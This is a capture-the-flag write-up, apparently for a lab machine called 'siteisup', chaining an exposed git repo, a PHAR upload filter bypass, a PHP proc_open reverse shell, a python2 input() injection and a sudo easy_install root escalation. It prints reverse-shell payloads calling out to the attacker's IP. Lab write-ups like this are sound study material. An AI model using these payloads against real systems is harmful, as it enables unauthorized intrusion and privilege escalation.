Main steps
1. Fuzz directories for exposed `git` repository
2. Fuzz subdomains for `dev` site
3. Enumerate `git` repository for special requirements for `dev` access
4. Add special headers to access `dev` site
5. Upload PHAR file for shell access
6. Enumerate `SUID` binary, abusing python2 `input` function to pivot
7. Enumerate `sudo -l` to find vulnerable script
8. Exploit `easy_intall` for root access

Learning points
5. PHP `.htaccess` headers
6. Scanning disabled PHP functions with `dfunc-bypasser`
7. PHP `phar://` wrapper usage
8. python2 input vulnerability

`nmap`
![[Pasted image 20260323204029.png]]

Ports 22, 80 open.

Website shows an input field asking for a URL to check if the site is up.
![[Pasted image 20260323204039.png]]

Ran it with my IP address and got an error stating `Hacking attempt was detected !`.
![[Pasted image 20260323204256.png]]

Ran it again, adding `http://` in front of my IP and was able to get output. The debug information seems to show the HTTP response of the URL scanned.
![[Pasted image 20260323204403.png]]

Since the website takes a URL as input, I tried running `SSRFmap` on it to see if there is an SSRF vulnerability, but did not seem to get any interesting results.

Back to `Feroxbuster`: found an exposed `git` repository at `/dev/.git`.
![[Pasted image 20260323205556.png]]

The repo contained a few PHP files, including an `admin.php` and `index.php`. All the pages here have a conditional at the top to prevent direct access.
![[Pasted image 20260323212657.png]]
![[Pasted image 20260323212703.png]]

Checked the `.htaccess` file and found the deny/ allow rule. The request needs to have  a special header for access.
![[Pasted image 20260323212732.png]]

Tried adding the headers and accessing the pages at `/dev/index.php` but was unable to.

Did a subdomain search with `ffuf` and found a `dev` subdomain - most likely will need to access the site from here instead.
![[Pasted image 20260323231947.png]]

Downloaded an extension called `Modify Header Value` to automatically add the special header whenever I access the site.
![[Pasted image 20260323232146.png]]

Accessing the dev site now brings me to this page.
![[Pasted image 20260323232254.png]]

Based on the source code from the repo found earlier, the site will check the extension of any file uploaded here against this list:
```
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
                die("Extension not allowed!");
        }
```

If the extension is not in the list, the file will be uploaded to the `uploads/` directory, read, then the site will be checked, then the file will be deleted.

Looking at the list, I noticed that it was missing one common PHP extension, the PHAR extension, which is a PHP archive format. 

Added a short test script `<?php phpinfo(); ?>` to a PHP file, then zipped it with the PHAR extension, and uploaded it to the site.
![[Pasted image 20260323233016.png]]

The upload was successful, and navigating to the `uploads/` directory shows the folder it was saved in, and the file `test.phar`. Opening it gives me the PHP info page.
![[Pasted image 20260323233110.png]]

Scrolling down here shows that a bunch of PHP functions are disabled, including those required for spawning a reverse shell or webshell.
![[Pasted image 20260323233152.png]]

There is tool called `dfunc-bypasser` here https://github.com/teambi0s/dfunc-bypasser that automatically checks the disabled functions in PHP to confirm if exploitation is possible. I cloned this tool and ran it on the PHP info page (which I saved as a HTML file), and the tool mentions to disable the `proc_open` function.
![[Pasted image 20260323233759.png]]

From the PHP documentation, this function can be used to execute commands. The PHP reverse shell I usually also makes use of this function to spawn the shell.
```
// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);
```

I will not need the `$pipes` variable here as I am not reading or writing anything from the process. Based on the script, I just need to replace the `$shell` variable here with my own reverse shell payload, and this should run.
```
// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$shell = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.47/4444 0>&1'";
$process = proc_open($shell, $descriptorspec, $pipes);
```

Accessing the file directly did not trigger the PHP code like it did with the PHP info file earlier, so instead used the `phar://` wrapper to run the code by accessing `http://dev.siteisup.htb/?page=phar://uploads/5d51a2a13294b02d63fcfded03260814/siteisup.phar/siteisup`, and got a reverse shell as `www-data`.
![[Pasted image 20260323235100.png]]

`/etc/passwd` shows a user named `developer` with the ID of 1002.
![[Pasted image 20260323235251.png]]

`www-data` is able to read `developer`'s home directory, where the user flag is. There is also a folder named `dev` with a ELF binary `siteisup` with its `SUID` bit set, and a python script.
![[Pasted image 20260323235514.png]]

Running `strings` on the binary shows that it runs the python script.
![[Pasted image 20260323235607.png]]

The script in question takes a URL as input, then checks its status code with `requests.get()` and prints the site's status.
![[Pasted image 20260323235706.png]]

The script looks like a python2 script from the print statement, so I checked what python versions are available, and saw that both python and python3 are present.
![[Pasted image 20260324000041.png]]

Since the script is running with python2, the `input` function being called here can be used for RCE, as in python2, the input is evaluated as python code instead of a string.

From this writeup is found on GitHub, https://github.com/3ls3if/Cybersecurity-Notes/blob/main/real-world-and-and-ctf/scripts-and-systems/python2-input-vulnerability.md, this can be exploited by simply passing `__import__("os").system("CMD")` to the input.

Tried running the payload with `id` and got `developer`'s ID.
![[Pasted image 20260324000452.png]]

Passed a reverse shell `bash` command to the script with `__import__("os").system("bash -c 'bash -i >& /dev/tcp/10.10.14.47/6666 0>&1'")` and got a shell as `developer`.

For some reason, I was unable to read the user flag from here, but I was able to read `developer`'s SSH key and gain access via SSH. (It is due to the group of the user still being `www-data`.)
![[Pasted image 20260324000843.png]]
![[Pasted image 20260324000856.png]]

Checked `sudo -l` and found a binary that `developer` can run as root without a password: `/usr/local/bin/easy_install`.
![[Pasted image 20260324000935.png]]

This is a python script that imports `setuptools.command.easy_install`, which is a deprecated module. This module was used for package building and installation.
![[Pasted image 20260324001013.png]]

The code takes an argument and transforms it with regex, then executes `main()`.

From GTFObins, all I need to do to gain a root shell is to write a python script containing code to spawn a shell, name it `setup.py`, save it to a directory, then point `easy_install` to that directory.
![[Pasted image 20260324002120.png]]
![[Pasted image 20260324002046.png]]

Got a shell as root.
![[Pasted image 20260324002108.png]]